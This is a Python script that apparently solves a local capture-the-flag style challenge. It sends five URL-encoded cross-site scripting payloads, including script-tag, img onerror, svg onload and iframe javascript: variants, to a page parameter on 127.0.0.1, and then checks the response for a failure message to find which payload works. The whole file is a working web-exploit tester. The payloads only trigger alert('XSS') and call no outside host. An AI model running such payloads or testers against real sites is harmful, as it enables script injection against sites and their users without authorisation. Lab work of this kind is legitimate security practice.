"""
XSS Payload Variant Tester
Tests 5 different XSS payloads containing 'XSS' string
Target: http://127.0.0.1:33081/page?name=[PAYLOAD]
"""
import urllib.parse
import socket
import time

# Target endpoint
HOST = "127.0.0.1"
PORT = 33081
PATH = "/page"

# XSS payloads to test - all include 'XSS' string
payloads = [
    ("script_tag", "<script>alert('XSS')</script>"),
    ("img_onerror", "<img src=x onerror=alert('XSS')>"),
    ("svg_onload", "<svg onload=alert('XSS')>"),
    ("body_onload", "<body onload=alert('XSS')>"),
    ("iframe_javascript", '<iframe src="javascript:alert(\'XSS\')"></iframe>')
]

def send_request(payload_encoded):
    """Send HTTP GET request and return response"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        
        # Construct HTTP request
        request = f"GET {PATH}?name={payload_encoded} HTTP/1.1\r\n"
        request += f"Host: {HOST}:{PORT}\r\n"
        request += "User-Agent: Mozilla/5.0 (XSS-Test)\r\n"
        request += "Accept: text/html\r\n"
        request += "Connection: close\r\n\r\n"
        
        # Send request
        sock.connect((HOST, PORT))
        sock.send(request.encode())
        
        # Receive response
        response = b""
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
            except:
                break
        
        sock.close()
        return response.decode('utf-8', errors='ignore')
        
    except Exception as e:
        return f"ERROR: {str(e)}"

def extract_solution_text(html):
    """Extract content from solution-text div"""
    import re
    match = re.search(r'<div class="solution-text"[^>]*>(.*?)</div>', html, re.DOTALL)
    if match:
        content = match.group(1).strip()
        # Clean up HTML tags
        content = re.sub(r'<[^>]+>', '', content)
        return content
    return "NOT_FOUND"

print("[*] XSS Payload Testing")
print(f"[*] Target: http://{HOST}:{PORT}{PATH}")
print(f"[*] Testing {len(payloads)} payloads\n")

results = []

for i, (payload_name, payload) in enumerate(payloads, 1):
    print(f"\n{'='*60}")
    print(f"[TEST {i}/{len(payloads)}] {payload_name}")
    print(f"{'='*60}")
    
    # URL encode payload
    encoded = urllib.parse.quote(payload, safe='')
    print(f"[+] Raw payload: {payload}")
    print(f"[+] URL encoded: {encoded}")
    
    # Send request
    print(f"[+] Sending request...")
    response = send_request(encoded)
    
    if response.startswith("ERROR:"):
        print(f"[-] Request failed: {response}")
        results.append((payload_name, payload, encoded, "ERROR", response))
        time.sleep(1)
        continue
    
    # Extract solution text
    solution_text = extract_solution_text(response)
    print(f"[+] solution-text: '{solution_text[:200]}'")
    
    # Check result
    if "Failed! Try again!" in solution_text:
        print(f"[-] Result: FAILED - Still showing failure message")
        
        # Check if payload is reflected
        if payload in response:
            print(f"[INFO] Raw payload found in response")
        elif encoded in response:
            print(f"[INFO] Encoded payload found in response")
        else:
            print(f"[INFO] Payload not reflected")
            
        results.append((payload_name, payload, encoded, "FAILED", solution_text))
    else:
        print(f"[+] Result: POTENTIAL SUCCESS - No failure message!")
        results.append((payload_name, payload, encoded, "SUCCESS", solution_text))
    
    # Small delay between requests
    time.sleep(0.5)

# Summary
print(f"\n\n{'='*60}")
print("[*] TEST SUMMARY")
print(f"{'='*60}")

successful = [r for r in results if r[3] == "SUCCESS"]
failed = [r for r in results if r[3] == "FAILED"]
errors = [r for r in results if r[3] == "ERROR"]

print(f"[*] Total payloads tested: {len(results)}")
print(f"[*] Successful: {len(successful)}")
print(f"[*] Failed: {len(failed)}")
print(f"[*] Errors: {len(errors)}")

if successful:
    print(f"\n[+] SUCCESSFUL PAYLOADS:")
    for r in successful:
        print(f"\n  Name: {r[0]}")
        print(f"  Raw: {r[1]}")
        print(f"  Encoded: {r[2]}")
        print(f"  Response: {r[4][:150]}")

if errors:
    print(f"\n[-] ERRORS:")
    for r in errors:
        print(f"  {r[0]}: {r[4]}")

print(f"\n[*] Test complete")
